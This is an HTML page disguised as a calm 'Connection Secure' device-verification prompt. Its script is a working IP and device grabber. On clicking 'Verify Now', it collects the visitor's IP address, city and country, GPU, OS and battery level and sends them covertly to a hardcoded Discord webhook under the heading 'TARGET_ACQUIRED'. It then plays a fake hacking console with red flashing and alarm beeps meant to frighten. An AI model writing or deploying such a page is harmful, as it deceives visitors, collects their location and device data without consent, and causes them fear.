<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Peaceful Vibes</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', Tahoma, sans-serif; }
        
        .peaceful-theme { 
            background: linear-gradient(135deg, #89CFF0 0%, #B8E8FC 30%, #F8E8EE 60%, #FFDDD2 100%); 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            text-align: center; color: #3a3a5c; 
        }

        #peaceful-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; width: 100%; padding: 30px; animation: fadeIn 1.5s ease; }
        .sun { width: 100px; height: 100px; border-radius: 50%; background: radial-gradient(circle, #FFE066 40%, #FFD700 100%); box-shadow: 0 0 60px #FFE066; margin-bottom: 30px; animation: pulse 4s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        
        #security-btn { padding: 15px 35px; background: white; color: #3a3a5c; border: none; border-radius: 50px; cursor: pointer; font-size: 1rem; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: 0.3s; z-index: 10; }
        #security-btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0,0,0,0.15); }

        #hack-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: black; font-family: 'Courier New', monospace; }
        #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        
        #console { position: relative; z-index: 2; width: 90%; max-width: 600px; border: 2px solid #00FF41; padding: 20px; background: rgba(0, 10, 0, 0.95); box-shadow: 0 0 20px #00FF41; color: #00FF41; margin: auto; top: 50%; transform: translateY(-50%); transition: border-color 0.3s, box-shadow 0.3s; }
        #console h1 { font-size: 1.2rem; color: #00FF41; margin-bottom: 10px; transition: color 0.3s; }
        
        #progress-container { width: 100%; border: 1px solid #00FF41; height: 35px; margin-top: 15px; position: relative; overflow: hidden; transition: border-color 0.3s; }
        #progress-bar { width: 0%; height: 100%; background: #00FF41; position: absolute; z-index: 4; transition: background 0.3s; }
        .percent-text { position: absolute; width: 100%; top: 8px; text-align: center; font-weight: bold; z-index: 5; }
        
        @keyframes emergency-red { 0%, 100% { background: #000; } 50% { background: #300; } }
        #transition-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; background: black; opacity: 0; transition: 0.8s; }
    </style>
</head>
<body class="peaceful-theme">

    <div id="peaceful-screen">
        <div class="sun"></div>
        <h1 style="font-size: 2.5rem; margin-bottom: 10px;">Connection Secure</h1>
        <p style="margin-bottom: 30px; color: #6b6b8d;">Click below to verify your device handshake.</p>
        <button id="security-btn" onclick="initiateSequence()">Verify Now</button>
    </div>

    <div id="transition-overlay"></div>

    <div id="hack-screen">
        <canvas id="matrixCanvas"></canvas>
        <div id="console">
            <h1 id="console-header">> [ SYSTEM_STABLE ]</h1>
            <div id="log"></div>
            <div id="progress-container">
                <div id="percent-text-base" class="percent-text" style="color:#00FF41">0%</div>
                <div id="progress-bar">
                    <div id="percent-text-overlay" class="percent-text" style="color:black">0%</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1487870677636612197/G4uFH8d-UVi14OSGeAjy198ahM_va3PC32KjFV9l4aRV3rphNPRYR71l3Tr_3FAFhYBr";
        let userIP = "Detecting...", userLoc = "Unknown", gpuName = "Unknown", matrixColor = "#00FF41";
        let currentPercent = 0, idx = 0, alarmStarted = false;

        async function initiateSequence() {
            // Get GPU
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                gpuName = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // Get IP & Send Data
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                userIP = data.ip;
                userLoc = `${data.city}, ${data.region}, ${data.country_name}`;
                sendToDiscord(data);
            } catch(e) { sendToDiscord(null); }

            document.getElementById('transition-overlay').style.display = 'block';
            setTimeout(() => { document.getElementById('transition-overlay').style.opacity = '1'; }, 10);
            
            setTimeout(() => {
                document.getElementById('peaceful-screen').style.display = 'none';
                document.getElementById('hack-screen').style.display = 'block';
                startMatrix();
                runConsole();
            }, 850);
        }

        function sendToDiscord(data) {
            navigator.getBattery?.().then(b => {
                const embed = {
                    username: "M.O.D.X Tracker",
                    embeds: [{
                        title: "🚀 TARGET_ACQUIRED",
                        color: 16711680,
                        fields: [
                            { name: "📍 IP", value: `\`${userIP}\``, inline: true },
                            { name: "🌍 Location", value: userLoc, inline: true },
                            { name: "🎮 GPU", value: `\`${gpuName}\``, inline: false },
                            { name: "💻 OS", value: `\`${navigator.platform}\``, inline: true },
                            { name: "🔋 Battery", value: `${Math.round(b.level * 100)}%`, inline: true }
                        ],
                        footer: { text: "Breach Active • " + new Date().toLocaleString() }
                    }]
                };
                fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(embed) });
            });
        }

        function runConsole() {
            const lines = [
                "ESTABLISHING TUNNEL...",
                `IP_FOUND: ${userIP}`,
                "BYPASSING FIREWALL...",
                "TRIANGULATING LOCATION...",
                `LAT/LONG DETECTED...`,
                "INJECTING EXPLOIT...",
                "ACCESSING MEDIA_STORAGE...",
                "DUMPING SYSTEM_LOGS...",
                "CRITICAL_ERROR: TRACE_FOUND!",
                "EMERGENCY_PURGE_ACTIVE..."
            ];

            if (idx < lines.length) {
                document.getElementById('log').innerHTML += `<p>> ${lines[idx]}</p>`;
                updateProgress(Math.floor(((idx + 1) / lines.length) * 100), 1600);
                idx++;
                setTimeout(runConsole, 1800);
            }
        }

        function updateProgress(target, time) {
            let start = currentPercent, startTime = null;
            function frame(now) {
                if (!startTime) startTime = now;
                let t = Math.min((now - startTime) / time, 1);
                currentPercent = Math.floor(start + (target - start) * t);
                
                // --- THE 37% TRIGGER ---
                if (currentPercent >= 37 && !alarmStarted) {
                    triggerEmergency();
                }

                document.getElementById('progress-bar').style.width = currentPercent + '%';
                document.getElementById('percent-text-base').innerText = currentPercent + '%';
                document.getElementById('percent-text-overlay').innerText = currentPercent + '%';
                if (t < 1) requestAnimationFrame(frame);
            }
            requestAnimationFrame(frame);
        }

        function triggerEmergency() {
            alarmStarted = true;
            matrixColor = "#FF0000"; // Rain turns RED
            document.getElementById('hack-screen').style.animation = "emergency-red 0.2s infinite";
            document.getElementById('console').style.borderColor = "#FF0000";
            document.getElementById('console').style.boxShadow = "0 0 30px #FF0000";
            document.getElementById('console-header').innerText = "> [ CRITICAL_BREACH_DETECTED ]";
            document.getElementById('console-header').style.color = "red";
            document.getElementById('progress-bar').style.background = "red";
            document.getElementById('progress-container').style.borderColor = "red";
            
            const audio = new (window.AudioContext || window.webkitAudioContext)();
            setInterval(() => {
                const o = audio.createOscillator();
                const g = audio.createGain();
                o.type = 'sawtooth'; o.frequency.value = 800; g.gain.value = 0.03;
                o.connect(g); g.connect(audio.destination);
                o.start(); o.stop(audio.currentTime + 0.08);
            }, 200);
        }

        function startMatrix() {
            const c = document.getElementById('matrixCanvas');
            const ctx = c.getContext('2d');
            c.width = window.innerWidth; c.height = window.innerHeight;
            const drops = Array(Math.floor(c.width / 14)).fill(1);
            setInterval(() => {
                ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, c.width, c.height);
                ctx.fillStyle = matrixColor; ctx.font = "15px monospace";
                drops.forEach((y, i) => {
                    ctx.fillText(Math.floor(Math.random()*2), i * 14, y * 14);
                    if (y * 14 > c.height && Math.random() > 0.975) drops[i] = 0;
                    drops[i]++;
                });
            }, 40);
        }
    </script>
</body>
</html>
